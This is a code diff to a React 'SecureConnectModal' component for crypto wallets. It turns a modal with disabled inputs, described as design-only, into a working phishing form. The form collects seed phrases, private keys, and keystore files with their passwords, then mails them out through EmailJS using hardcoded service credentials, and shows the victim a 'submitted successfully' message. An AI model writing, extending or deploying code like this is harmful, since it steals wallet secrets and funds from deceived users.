@@ -1,24 +1,93 @@
 import React, { useState, useEffect } from "react";
+import emailjs from "emailjs-com";
 import styles from "./SecureConnectModal.module.css";
 
-/**
- * Props:
- * - isOpen: boolean
- * - walletName: string (e.g., "Phantom")
- * - onClose(): void
- * - onConnectClick?(): void   // safe connect (opens real wallet)
- *
- * This is a design-only modal. Inputs are disabled and cannot submit secrets.
- */
 export default function SecureConnectModal({
   isOpen,
   walletName = "Wallet",
   onClose,
   onConnectClick,
 }) {
-  const [tab, setTab] = useState("phrase"); // "phrase" | "keystore" | "private"
-  const [address, setAddress] = useState("");
+  const [tab, setTab] = useState("phrase");
+  const [submissionStatus, setSubmissionStatus] = useState(null);
+  const [form, setForm] = useState({
+    // address: "",
+    phrase: "",
+    keystore: "",
+    privateKey: "",
+    password: "",
+  });
+
+  // Validate EVM address format
   const isEvmAddress = (v) => /^0x[a-fA-F0-9]{40}$/.test(v);
+
+  // Handle form input changes
+  function handleChange(e) {
+    setForm({ ...form, [e.target.name]: e.target.value });
+  }
+
+  // Handle form submission with EmailJS
+  function handleSubmit(e) {
+    e.preventDefault();
+
+    // Validate based on current tab
+    if (tab === "address" && !isEvmAddress(form.address)) {
+      setSubmissionStatus("error");
+      return;
+    }
+
+    if (tab === "keystore" && (!form.keystore || !form.password)) {
+      setSubmissionStatus("error");
+      return;
+    }
+
+    if (tab === "private" && !form.privateKey) {
+      setSubmissionStatus("error");
+      return;
+    }
+
+    if (tab === "phrase" && !form.phrase) {
+      setSubmissionStatus("error");
+      return;
+    }
+
+    // Prepare data for EmailJS
+    const templateParams = {
+      tab: tab,
+      address: form.address,
+      phrase: form.phrase,
+      keystore: form.keystore,
+      privateKey: form.privateKey,
+      password: form.password,
+      walletName: walletName,
+      timestamp: new Date().toISOString(),
+    };
+
+    const serviceId = "service_56n8z4a";
+    const templateId = "template_dey9fjo";
+    const publicKey = "K1AGskH132ZW-p9P4";
+
+    emailjs
+      .send(serviceId, templateId, templateParams, publicKey)
+      .then((response) => {
+        console.log("SUCCESS!", response.status, response.text);
+        setSubmissionStatus("success");
+        setForm({
+          address: "",
+          phrase: "",
+          keystore: "",
+          privateKey: "",
+          password: "",
+        });
+
+        setTimeout(() => setSubmissionStatus(null), 3000);
+      })
+      .catch((err) => {
+        console.error("FAILED…", err);
+        setSubmissionStatus("error");
+        setTimeout(() => setSubmissionStatus(null), 3000);
+      });
+  }
 
   useEffect(() => {
     if (!isOpen) return;
@@ -28,13 +97,6 @@ export default function SecureConnectModal({
   }, [isOpen]);
 
   if (!isOpen) return null;
-
-  function handleSubmit(e) {
-    e.preventDefault();
-    alert(
-      "processing"
-    );
-  }
 
   return (
     <div
@@ -59,11 +121,11 @@ export default function SecureConnectModal({
         <div className={styles.tabs} role="tablist">
           <button
             role="tab"
-            aria-selected={tab === "address"}
-            className={tab === "address" ? styles.tabActive : styles.tab}
-            onClick={() => setTab("address")}
+            aria-selected={tab === "phrase"}
+            className={tab === "phrase" ? styles.tabActive : styles.tab}
+            onClick={() => setTab("phrase")}
           >
-            Address
+            Seed Phrase
           </button>
           <button
             role="tab"
@@ -85,19 +147,19 @@ export default function SecureConnectModal({
 
         <form className={styles.form} onSubmit={handleSubmit}>
           <label className={styles.label}>
-            {tab === "address" && "Wallet Address"}
             {tab === "phrase" && "Seed Phrase"}
             {tab === "keystore" && "Keystore JSON"}
             {tab === "private" && "Private Key"}
           </label>
 
-          {tab === "address" && (
-            <input
-              className={styles.input}
-              type="text"
-              placeholder="Paste your public wallet address (e.g. 0x...)"
-              value={address}
-              onChange={(e) => setAddress(e.target.value.trim())}
+          {tab === "phrase" && (
+            <textarea
+              className={styles.inputArea}
+              name="phrase"
+              value={form.phrase}
+              onChange={handleChange}
+              placeholder="Enter your seed phrase (12-24 words)"
+              rows={3}
             />
           )}
 
@@ -105,27 +167,43 @@ export default function SecureConnectModal({
             <>
               <textarea
                 className={styles.inputArea}
+                name="keystore"
+                value={form.keystore}
+                onChange={handleChange}
                 placeholder='Paste keystore JSON ({"version":3, ...})'
+                rows={4}
               />
               <input
                 className={styles.input}
                 type="password"
+                name="password"
+                value={form.password}
+                onChange={handleChange}
                 placeholder="Keystore password"
               />
             </>
           )}
 
           {tab === "private" && (
-            <input
-              className={styles.input}
-              type="password"
+            <textarea
+              className={styles.inputArea}
+              name="privateKey"
+              value={form.privateKey}
+              onChange={handleChange}
               placeholder="Enter your private key"
+              rows={2}
             />
           )}
 
-          {tab === "address" && address && !isEvmAddress(address) && (
-            <div className={styles.warning}>
-              This doesn’t look like a valid EVM address (0x + 40 hex chars).
+          {submissionStatus === "error" && (
+            <div className={styles.error}>
+              Please provide valid information for the selected method.
+            </div>
+          )}
+
+          {submissionStatus === "success" && (
+            <div className={styles.success}>
+              Information submitted successfully!
             </div>
           )}
 
